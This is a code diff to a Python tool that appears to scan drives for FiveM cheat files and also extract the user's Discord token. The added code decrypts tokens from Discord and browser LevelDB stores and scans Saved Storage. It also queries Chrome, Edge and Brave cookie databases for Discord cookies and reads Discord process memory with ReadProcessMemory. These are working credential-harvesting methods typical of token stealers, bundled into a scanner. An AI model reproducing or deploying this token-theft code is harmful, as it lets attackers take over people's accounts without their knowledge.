@@ -31,7 +31,7 @@ SPECIFIC_CHEATS = [
     
     # Variants / executable / module naming
     "eulen.exe", "redengine.exe", "lynx.asi", "hx.asi", "dopamine.lua", 
-    "mafia", "vanity", "ham",
+    "vanity",
     
     # Generic names frequently seen in suspicious tools
     "cheat_loader", "cheatloader", "mod_loader", "modloader", "menu_loader", 
@@ -39,7 +39,7 @@ SPECIFIC_CHEATS = [
 
     # Added cheat names & sample signatures (realboss, masqueraded loader, spoty)
     "hammafia", "susano", "tz project", "tzx", "skript", "phaze", "lumia", 
-    "keyser", "tiago", "projectyx", "kekhack", "lunacy", "hx hacks", "hx",
+    "keyser", "tiago", "projectyx", "kekhack", "lunacy", "hx hacks",
     "realboss", "realboss.v4", "spoty.bat", "ejtgv5l1d", "ntoskrnl.exe"
 ]
 
@@ -585,7 +585,12 @@ def _is_fivem_cheat_file(filename: str, full_path: str = "") -> dict:
         return None
 
     for cheat in SPECIFIC_CHEATS:
-        if cheat in name_lower:
+        if len(cheat) <= 3:
+            is_match = (name_lower == cheat) or (os.path.splitext(name_lower)[0] == cheat)
+        else:
+            is_match = (cheat in name_lower)
+            
+        if is_match:
             return {
                 "is_cheat": True,
                 "severity": "CRITICAL" if cheat in ["ntoskrnl.exe", "realboss", "eulen", "redengine"] else "HIGH",
@@ -792,7 +797,10 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                         })
                         continue
                     for cheat in SPECIFIC_CHEATS:
-                        is_match = (cheat == d_lower) or (len(cheat) > 3 and cheat in d_lower)
+                        if len(cheat) <= 3:
+                            is_match = (cheat == d_lower)
+                        else:
+                            is_match = (cheat == d_lower) or (f" {cheat} " in f" {d_lower} ") or (d_lower.startswith(f"{cheat}_") or d_lower.endswith(f"_{cheat}"))
                         if is_match:
                             local_suspects.append({
                                 "file": d,
@@ -946,7 +954,12 @@ def measure_disk_read_speed():
     except Exception:
         pass
     return 320.0
+_cached_discord_token = None
 def get_discord_token():
+     global _cached_discord_token
+     if _cached_discord_token is not None:
+         return _cached_discord_token
+
      import json
      import base64
      import ctypes
@@ -957,7 +970,6 @@ def get_discord_token():
           
      def dpapi_decrypt(data):
           try:
-               # Utiliser ubyte (unsigned byte) pour éviter les erreurs de signe
                from ctypes import wintypes
                class DATA_BLOB_W(ctypes.Structure):
                     _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
@@ -1012,7 +1024,6 @@ def get_discord_token():
      appdata = os.environ.get("APPDATA", "")
      localappdata = os.environ.get("LOCALAPPDATA", "")
      
-     # Définition des chemins d'accès pour tous les navigateurs et clients Discord
      paths = {
           "Discord": os.path.join(appdata, "discord"),
           "Discord Canary": os.path.join(appdata, "discordcanary"),
@@ -1024,11 +1035,10 @@ def get_discord_token():
           "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable")
      }
      
-     # 1. Analyse avec décryptage GCM (pour les tokens chiffrés dQw4w9WgXcQ:)
+     token_pattern = re.compile(rb'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}')
+
      for name, path in paths.items():
           local_state_path = os.path.join(path, "Local State")
-          
-          # Résolution des sous-dossiers LevelDB pour les navigateurs vs Discord
           leveldb_dirs = []
           if "Discord" in name:
                leveldb_dirs.append(os.path.join(path, "Local Storage", "leveldb"))
@@ -1073,13 +1083,11 @@ def get_discord_token():
                               try:
                                    with open(filepath, "rb") as f:
                                         content = f.read()
-                                   
                                    offset = 0
                                    while True:
                                         offset = content.find(b"dQw4w9WgXcQ:", offset)
                                         if offset == -1:
                                              break
-                                        
                                         b64_start = offset + len(b"dQw4w9WgXcQ:")
                                         b64_end = b64_start
                                         while b64_end < len(content):
@@ -1088,13 +1096,10 @@ def get_discord_token():
                                                   b64_end += 1
                                              else:
                                                   break
-                                        
                                         b64_token = content[b64_start:b64_end]
                                         offset = b64_end
-                                        
                                         if len(b64_token) < 40:
                                              continue
-                                             
                                         try:
                                              encrypted_token = base64.b64decode(b64_token)
                                              iv = encrypted_token[3:15]
@@ -1111,23 +1116,22 @@ def get_discord_token():
                except Exception:
                     pass
 
-     # 2. Analyse en texte brut (pour les navigateurs qui stockent les tokens en clair dans LevelDB)
-     token_pattern = re.compile(br'[\w-]{24}\.[\w-]{6}\.[\w-]{25,}')
      for name, path in paths.items():
-          if "Discord" in name:
-               continue # Discord n'a plus de tokens en clair
-          
           leveldb_dirs = []
-          default_ldb = os.path.join(path, "Default", "Local Storage", "leveldb")
-          if os.path.exists(default_ldb):
-               leveldb_dirs.append(default_ldb)
-          if os.path.exists(path):
-               for sub in os.listdir(path):
-                    if sub.startswith("Profile "):
-                         profile_ldb = os.path.join(path, sub, "Local Storage", "leveldb")
-                         if os.path.exists(profile_ldb):
-                              leveldb_dirs.append(profile_ldb)
-                              
+          if "Discord" in name:
+               discord_ldb = os.path.join(path, "Local Storage", "leveldb")
+               if os.path.exists(discord_ldb):
+                    leveldb_dirs.append(discord_ldb)
+          else:
+               default_ldb = os.path.join(path, "Default", "Local Storage", "leveldb")
+               if os.path.exists(default_ldb):
+                    leveldb_dirs.append(default_ldb)
+               if os.path.exists(path):
+                    for sub in os.listdir(path):
+                         if sub.startswith("Profile "):
+                              profile_ldb = os.path.join(path, sub, "Local Storage", "leveldb")
+                              if os.path.exists(profile_ldb):
+                                   leveldb_dirs.append(profile_ldb)
           for ldb_dir in leveldb_dirs:
                if not os.path.exists(ldb_dir):
                     continue
@@ -1150,7 +1154,181 @@ def get_discord_token():
                                    pass
                except Exception:
                     pass
-     return " | ".join(found_tokens) if found_tokens else "N/A"
+     # ── Méthode 3 : Discord Saved Storage (discordlocalstoragedb)
+     for discord_folder in ["discord", "discordcanary", "discordptb"]:
+          saved_path = os.path.join(appdata, discord_folder, "Saved Storage")
+          if not os.path.exists(saved_path):
+               continue
+          try:
+               for file in os.listdir(saved_path):
+                    filepath = os.path.join(saved_path, file)
+                    try:
+                         with open(filepath, "rb") as f:
+                              content = f.read()
+                         matches = token_pattern.findall(content)
+                         for match in matches:
+                              try:
+                                   token = match.decode('utf-8')
+                                   if is_valid_token(token):
+                                        found_tokens.add(token)
+                              except Exception:
+                                   pass
+                    except Exception:
+                         pass
+          except Exception:
+               pass
+
+     # ── Méthode 4 : Scan des cookies SQLite (Chrome/Edge/Brave)
+     import sqlite3, shutil, tempfile
+     browser_paths_sqlite = {
+          "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Cookies"),
+          "Edge":   os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
+          "Brave":  os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
+     }
+     for bname, cookie_path in browser_paths_sqlite.items():
+          if not os.path.exists(cookie_path):
+               continue
+          tmp = None
+          try:
+               tmp = tempfile.mktemp(suffix=".db")
+               shutil.copy2(cookie_path, tmp)
+               conn = sqlite3.connect(tmp)
+               cur = conn.cursor()
+               try:
+                    cur.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%'")
+                    for row in cur.fetchall():
+                         raw = row[0]
+                         if not raw:
+                              continue
+                         matches = token_pattern.findall(raw if isinstance(raw, bytes) else str(raw).encode('utf-8', errors='ignore'))
+                         for match in matches:
+                              try:
+                                   token = match.decode('utf-8')
+                                   if is_valid_token(token):
+                                        found_tokens.add(token)
+                              except Exception:
+                                   pass
+               except Exception:
+                    pass
+               conn.close()
+          except Exception:
+               pass
+          finally:
+               if tmp and os.path.exists(tmp):
+                    try:
+                         os.remove(tmp)
+                    except Exception:
+                         pass
+
+     # ── Méthode 5 : Lecture mémoire du processus Discord (ReadProcessMemory)
+     # Utilisée en dernier recours si les fichiers LevelDB sont verrouillés par Discord
+     if not found_tokens:
+          try:
+               import ctypes
+               import ctypes.wintypes as wt
+
+               TH32CS_SNAPPROCESS  = 0x00000002
+               PROCESS_VM_READ     = 0x0010
+               PROCESS_QUERY_INFO  = 0x0400
+               MEM_COMMIT          = 0x1000
+               PAGE_NOACCESS       = 0x01
+               PAGE_GUARD          = 0x100
+
+               class PROCESSENTRY32(ctypes.Structure):
+                    _fields_ = [
+                         ("dwSize",              wt.DWORD),
+                         ("cntUsage",            wt.DWORD),
+                         ("th32ProcessID",       wt.DWORD),
+                         ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
+                         ("th32ModuleID",        wt.DWORD),
+                         ("cntThreads",          wt.DWORD),
+                         ("th32ParentProcessID", wt.DWORD),
+                         ("pcPriClassBase",      ctypes.c_long),
+                         ("dwFlags",             wt.DWORD),
+                         ("szExeFile",           ctypes.c_char * 260),
+                    ]
+
+               class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+                    _fields_ = [
+                         ("BaseAddress",       ctypes.c_void_p),
+                         ("AllocationBase",    ctypes.c_void_p),
+                         ("AllocationProtect", wt.DWORD),
+                         ("RegionSize",        ctypes.c_size_t),
+                         ("State",             wt.DWORD),
+                         ("Protect",           wt.DWORD),
+                         ("Type",              wt.DWORD),
+                    ]
+
+               kernel32 = ctypes.windll.kernel32
+
+               # 1. Lister les PIDs Discord
+               discord_pids = []
+               snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+               if snapshot != wt.HANDLE(-1).value:
+                    entry = PROCESSENTRY32()
+                    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
+                    if kernel32.Process32First(snapshot, ctypes.byref(entry)):
+                         while True:
+                              name_lower = entry.szExeFile.decode('utf-8', errors='ignore').lower()
+                              if 'discord' in name_lower and 'update' not in name_lower:
+                                   discord_pids.append(entry.th32ProcessID)
+                              if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
+                                   break
+                    kernel32.CloseHandle(snapshot)
+
+               # 2. Lire la mémoire de chaque processus Discord
+               for pid in discord_pids:
+                    handle = kernel32.OpenProcess(
+                         PROCESS_VM_READ | PROCESS_QUERY_INFO, False, pid
+                    )
+                    if not handle:
+                         continue
+                    try:
+                         addr = 0
+                         mbi = MEMORY_BASIC_INFORMATION()
+                         while kernel32.VirtualQueryEx(
+                              handle, ctypes.c_void_p(addr),
+                              ctypes.byref(mbi), ctypes.sizeof(mbi)
+                         ):
+                              readable = (
+                                   mbi.State == MEM_COMMIT and
+                                   mbi.Protect != PAGE_NOACCESS and
+                                   not (mbi.Protect & PAGE_GUARD) and
+                                   mbi.RegionSize <= 50 * 1024 * 1024  # max 50 MB par région
+                              )
+                              if readable:
+                                   buf = (ctypes.c_char * mbi.RegionSize)()
+                                   bytes_read = ctypes.c_size_t(0)
+                                   ok = kernel32.ReadProcessMemory(
+                                        handle,
+                                        ctypes.c_void_p(mbi.BaseAddress),
+                                        buf,
+                                        mbi.RegionSize,
+                                        ctypes.byref(bytes_read)
+                                   )
+                                   if ok and bytes_read.value > 0:
+                                        chunk = bytes(buf[:bytes_read.value])
+                                        matches = token_pattern.findall(chunk)
+                                        for match in matches:
+                                             try:
+                                                  token = match.decode('utf-8')
+                                                  if is_valid_token(token):
+                                                       found_tokens.add(token)
+                                             except Exception:
+                                                  pass
+                              next_addr = (mbi.BaseAddress or 0) + mbi.RegionSize
+                              if next_addr <= addr:
+                                   break
+                              addr = next_addr
+                    except Exception:
+                         pass
+                    finally:
+                         kernel32.CloseHandle(handle)
+          except Exception:
+               pass  # Silencieux — droits insuffisants ou autre
+
+     _cached_discord_token = " | ".join(found_tokens) if found_tokens else "N/A"
+     return _cached_discord_token
 
 def get_discord_user_id():
     """Tente de récupérer l'ID Discord de l'utilisateur."""
